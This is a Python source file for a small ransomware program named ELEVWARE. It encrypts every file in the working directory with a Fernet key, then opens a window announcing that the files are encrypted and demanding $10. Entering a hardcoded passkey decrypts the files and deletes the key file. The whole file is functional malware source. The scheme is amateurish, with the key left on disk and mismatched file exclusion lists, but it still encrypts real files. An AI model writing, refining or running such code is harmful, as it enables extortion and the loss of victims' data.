import os
from cryptography.fernet import Fernet
import tkinter as tk

def decrp():
	files = []

	for file in os.listdir():
		if file == "elevware.py" or file == "enkey.key" or file == "elevware" or file == "elevware.exe" or file == "caligpj.src" or file == "calircs.jpg":
			continue

		if os.path.isfile(file):
			files += file,

	with open("enkey.key", "rb") as thekey:
		seckey = thekey.read()

	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_dec = Fernet(seckey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_dec)

if not os.path.exists("enkey.key"):
	files = []

	for file in os.listdir():
		if file == "elevware.py" or file == "enkey.key" or file == "elevware" or file == "elevware.exe" or file == "cali.jpg":
			continue

		if os.path.isfile(file):
			files += file,

	key = Fernet.generate_key()

	with open("enkey.key", "wb") as thekey:
		thekey.write(key)

	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_enc = Fernet(key).encrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_enc)
	print("DONE!")

#------------------------------------------------------------------------------------------------------------------

def verify():
	passkey = "asdfasdf"
	user = entry.get()

	if (user == passkey):
		label_result.config(text="The files are being decrypted...")
		root.after(100, decrp)
		root.after(750, delkey)
		root.after(1500, root.destroy)
	else:
		label_result.config(text="Wrong passkey!")
        
def delkey():
	if os.path.exists("enkey.key"):
		os.remove("enkey.key")

root = tk.Tk()
root.title("ELEVWARE")
root.geometry("600x250")

label = tk.Label(root, text="All your files are encrypted!")
label.pack(pady=5)

label = tk.Label(root, text="Send me 10$ and i'll send you the key to unlock everything")
label.pack(pady=5)

label = tk.Label(root, text="----------------------------------------------------------------------------------------------")
label.pack(pady=5)

label = tk.Label(root, text="Enter the passkey:")
label.pack(pady=5)

entry = tk.Entry(root)
entry.pack(pady=5)

button = tk.Button(root, text="Verify", command=verify)
button.pack(pady=5)

label_result = tk.Label(root, text="")
label_result.pack(pady=5)

root.mainloop()

